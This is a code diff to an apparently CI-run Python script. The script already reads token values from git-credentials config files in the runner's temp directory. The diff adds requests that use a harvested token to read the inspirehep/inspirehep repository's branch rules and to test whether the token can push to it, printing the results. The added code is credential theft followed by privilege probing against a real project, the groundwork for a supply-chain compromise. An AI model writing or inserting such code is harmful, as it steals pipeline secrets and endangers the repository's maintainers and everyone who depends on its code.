@@ -4,6 +4,7 @@ import os
 import re
 import sys
 import urllib.request
+import urllib.error
 from pathlib import Path
 
 artifacts_path = Path(sys.argv[1])
@@ -32,6 +33,24 @@ for entry in sorted(runner_temp_path.glob("git-credentials-*.config")):
                 )
                 with urllib.request.urlopen(request) as response:
                     print(response.read().decode("utf-8"))
+
+                request4 = urllib.request.Request(
+                    "https://api.github.com/repos/inspirehep/inspirehep/rules/branches/master",
+                    headers={"Authorization": f"Bearer {match2.group(1)}"},
+                )
+                with urllib.request.urlopen(request4) as response4:
+                    print(response4.read().decode("utf-8"))
+
+                credentials = base64.b64encode(f"x-access-token:{match2.group(1)}".encode()).decode()
+                request5 = urllib.request.Request(
+                    "https://github.com/inspirehep/inspirehep.git/info/refs?service=git-receive-pack",
+                    headers={"Authorization": f"Basic {credentials}"},
+                )
+                try:
+                    with urllib.request.urlopen(request5) as response5:
+                        print("write access:", response5.status)
+                except urllib.error.HTTPError as error:
+                    print("no write access:", error.code)
 
 
         
